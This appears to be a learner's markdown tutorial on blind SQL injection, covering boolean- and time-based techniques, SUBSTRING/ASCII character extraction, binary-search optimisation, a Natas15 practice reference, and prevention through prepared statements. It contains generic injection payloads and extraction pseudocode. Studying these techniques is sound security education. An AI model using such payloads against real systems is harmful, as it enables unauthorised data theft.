# Blind SQL Injection

## Introduction

Blind SQL Injection is a type of SQL Injection where the application is vulnerable, but the database results are not directly displayed.

Instead of seeing the output, an attacker extracts information by observing application behavior.

Examples:

- Different responses
- Error changes
- Response delays

---

# Why is it called Blind?

In normal SQL Injection:

```text
Request
   |
   v
Database
   |
   v
Results displayed
```

Example:

```text
username : admin
password : admin123
```

---

In Blind SQL Injection:

```text
Request
   |
   v
Database
   |
   v
Only TRUE/FALSE behavior
```

The attacker has to ask questions.

Example:

```text
Is the first password character 'a'?

YES / NO
```

---

# Types of Blind SQL Injection

Main types:

1. Boolean-Based Blind SQL Injection
2. Time-Based Blind SQL Injection

---

# Boolean-Based Blind SQL Injection

Boolean-Based SQL Injection depends on different application responses.

The database answers:

```text
TRUE

or

FALSE
```

---

## Testing TRUE Condition

Payload:

```sql
' AND 1=1--
```

Query:

```sql
SELECT *
FROM users
WHERE username='admin'
AND 1=1;
```

Since:

```sql
1=1
```

is TRUE.

The application behaves normally.

---

## Testing FALSE Condition

Payload:

```sql
' AND 1=2--
```

Query:

```sql
SELECT *
FROM users
WHERE username='admin'
AND 1=2;
```

Since:

```sql
1=2
```

is FALSE.

The application response changes.

---

# Extracting Hidden Data

If responses are different, we can extract data one character at a time.

Example:

```sql
' AND SUBSTRING(password,1,1)='a'--
```

Meaning:

```text
Is the first character of password 'a'?
```

---

If TRUE:

```text
Save character
```

If FALSE:

```text
Try another character
```

---

# SUBSTRING Function

SUBSTRING extracts part of a string.

Example:

Password:

```text
Secret123
```

Query:

```sql
SUBSTRING(password,1,1)
```

Returns:

```text
S
```

---

Query:

```sql
SUBSTRING(password,2,1)
```

Returns:

```text
e
```

---

# Character Extraction Process

Example password:

```text
Cat123
```

Unknown:

```text
??????
```

Test:

```sql
Is first char A? ❌

Is first char B? ❌

Is first char C? ✅
```

Now:

```text
C?????
```

Repeat.

---

# Automation Logic

Manual testing is slow.

Automation:

```python
password=""

for position in password:

    for character in charset:

        send_payload()

        if response_is_true:

            password += character
```

---

# Optimizing with Binary Search

Instead of testing:

```text
a
b
c
d
...
```

Compare ASCII values.

Example:

```sql
ASCII(SUBSTRING(password,1,1)) > 80
```

Question:

```text
Is the character value greater than 80?
```

---

If TRUE:

Search higher values.

If FALSE:

Search lower values.

---

Comparison:

Normal:

```text
32 × 62 attempts

≈ 2000 requests
```

Binary Search:

```text
32 × 7 attempts

≈ 220 requests
```

Much faster.

---

# Time-Based Blind SQL Injection

Sometimes the website response does not visibly change.

Example:

TRUE and FALSE look identical.

In this case, response time can reveal information.

---

## SLEEP Function

Example:

```sql
' AND IF(1=1,SLEEP(5),0)--
```

Meaning:

```text
If condition is TRUE:

wait 5 seconds
```

---

TRUE:

```text
Page loads slowly
```

FALSE:

```text
Normal response time
```

---

# Extracting Using Time Delay

Example:

```sql
' AND IF(
SUBSTRING(password,1,1)='a',
SLEEP(5),
0
)--
```

Question:

```text
Is first character 'a'?
```

If page delays:

```text
Correct
```

---

# Attack Flow

```
Find Injection Point
        |
        v
Test TRUE Condition
        |
        v
Test FALSE Condition
        |
        v
Observe Difference
        |
        v
Ask Database Questions
        |
        v
Extract Characters
        |
        v
Rebuild Secret Data
```

---

# Real Practice Example

OverTheWire Natas15:

Concept:

```text
Boolean-Based Blind SQL Injection
```

Response:

TRUE:

```text
This user exists.
```

FALSE:

```text
User does not exist.
```

Used:

- SUBSTRING()
- ASCII()
- Binary Search
- Python Automation

---

# Prevention

Use prepared statements.

Unsafe:

```sql
SELECT *
FROM users
WHERE username='$input';
```

Safe:

```sql
SELECT *
FROM users
WHERE username=?;
```

---

Other protections:

- Input validation
- Least privilege database users
- Avoid detailed responses
- Secure error handling

---

# Key Takeaways

- Blind SQLi does not directly display data.
- Information is leaked through behavior differences.
- Boolean-Based SQLi uses TRUE/FALSE responses.
- Time-Based SQLi uses response delays.
- SUBSTRING helps extract characters.
- Automation is important.
- Binary search improves extraction speed.

---

## Practice

Completed:

TryHackMe SQL Injection Introduction

Related:

- Blind SQL Injection Authentication Bypass
- Boolean-Based SQL Injection
- Time-Based SQL Injection
- OverTheWire Natas15